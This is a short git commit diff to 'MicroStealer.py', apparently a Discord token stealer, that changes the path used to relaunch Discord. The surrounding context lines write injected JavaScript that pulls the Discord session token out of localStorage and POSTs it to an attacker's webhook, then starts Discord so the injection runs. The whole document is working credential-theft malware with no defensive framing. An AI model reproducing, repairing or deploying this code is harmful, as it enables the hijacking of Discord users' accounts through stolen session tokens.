4b33aa369279d3b0f5282eed07f8028f9a7c2919
DeKrypt <52050537+dekrypted@users.noreply.github.com>
2022-02-15 18:49:24 -0500

    Update MicroStealer.py

--- MicroStealer.py
+++ MicroStealer.py
@@ -10,7 +10,7 @@ for a,b,c in os.walk(env):
                 f.write(f'''var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '"{webhook}"', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}');";''')
                 f.close()
             try:
-                os.startfile(os.getenv('appdata')+'\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc')
+                os.startfile(os.getenv('appdata')+'\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk')
                 exit()
             except:
                 exit()
